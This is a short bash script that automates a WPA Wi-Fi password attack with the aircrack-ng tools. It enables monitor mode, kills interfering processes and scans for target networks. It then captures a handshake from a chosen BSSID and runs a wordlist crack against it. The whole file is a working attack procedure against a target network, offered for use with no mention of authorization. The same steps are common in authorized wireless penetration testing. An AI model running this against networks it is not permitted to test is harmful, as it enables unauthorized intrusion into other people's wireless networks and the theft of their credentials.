#!/bin/bash

# STEP 1
sudo airmon-ng
echo Enter your Interface:
read interface
sudo airmon-ng start $interface

# STEP 2
echo Enter the PIDs of any processes to kill:
echo If no processes to kill or done, type done:
PID=0
while [ $PID != done ]
do
	echo Enter process:
	read PID
	PIDs+="$PID "
	sudo airmon-ng check kill "${PID}"	
done
echo "Killed processes: $PIDs"
echo "Running capture tool. Keep track of the BSSID and channel your target and press 'Ctrl-c' once you are done."
read -p "Press Enter to continue."

# STEP 3
sudo airodump-ng "${interface}mon"

# STEP 4
echo Enter channel of target:
read channel
echo Enter BSSID of target:
read BSSID
mkdir tmp
echo "Running capture tool. Run until WPA handshake icon with your target's BSSID appears on the topright corner and press 'Ctrl-c' once you are done."
read -p "Press Enter to continue."
sudo airodump-ng -c $channel --bssid $BSSID -w ./tmp/ "${interface}mon"

# STEP 5
echo Enter the filename of your wordlist:
read wordlist
aircrack-ng -a2 -b $BSSID -w ./"$wordlist" ./tmp/-01.cap

# CLEANUP
sudo airmon-ng stop "${interface}mon"
sudo rm -r tmp

